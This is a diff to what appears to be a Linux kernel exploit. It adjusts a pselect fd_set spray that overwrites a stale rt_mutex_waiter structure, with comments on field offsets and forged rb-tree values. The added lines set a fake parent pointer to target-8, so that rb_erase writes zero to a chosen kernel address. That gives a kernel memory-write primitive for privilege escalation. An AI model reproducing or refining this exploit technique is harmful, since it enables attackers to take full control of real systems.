@@ -112,18 +112,22 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
      *   +0x18 pi_tree_entry (same)                             = 24 bytes
      *   +0x30 task (8)   +0x38 lock (8)   +0x40 list (16)
      *
-     * PSELECT_ROUTE_NFDS=64 -> 1 word/set = 3 bits total. Only waiter words
-     * 2..4 (tree_entry) are placed; pi_tree_entry words 5..7 are beyond the
-     * copy window and keep real kernel-written values. This is required:
-     *   - pi_tree_entry must stay linked correctly in the owner's
-     *     pi_waiters (rt_mutex_adjust_prio_chain walks it during
-     *     sched_setattr, and parent=0 crashes on traversal).
-     *   - task/lock must stay real (vendor BUG_ON root->lock != lock).
+     * NFDS=128 (2 words/set): covers tree_entry + pi_tree_entry.
+     * task (+0x30) and lock (+0x38) are NOT copied.
+     *
      * tree_pc = 1 (RB_BLACK): prevents rb_insert_color NULL-grandparent
-     * deref when the consumer waiter is inserted under the stale node. */
+     * deref when the consumer waiter is inserted under the stale node.
+     *
+     * pi_parent = fake_parent (= target-8): the pi_waiters rb_erase in
+     * rt_mutex_adjust_prio_chain reads __rb_parent_color as the parent
+     * pointer; setting it to target-8 means the erase writes
+     * parent->rb_right = *(target-8+8) = *(target) = 0. */
     {2, 1, "tree_pc"},
     {3, 0, "tree_right"},
     {4, 0, "tree_left"},
+    {5, (uint64_t)pselect_custom_target ? (uint64_t)(pselect_custom_target - 8) : 1, "pi_parent"},
+    {6, 0, "pi_right"},
+    {7, 0, "pi_left"},
 #else
     {2, 0, "tree_pc"},
     {3, 0, "tree_right"},
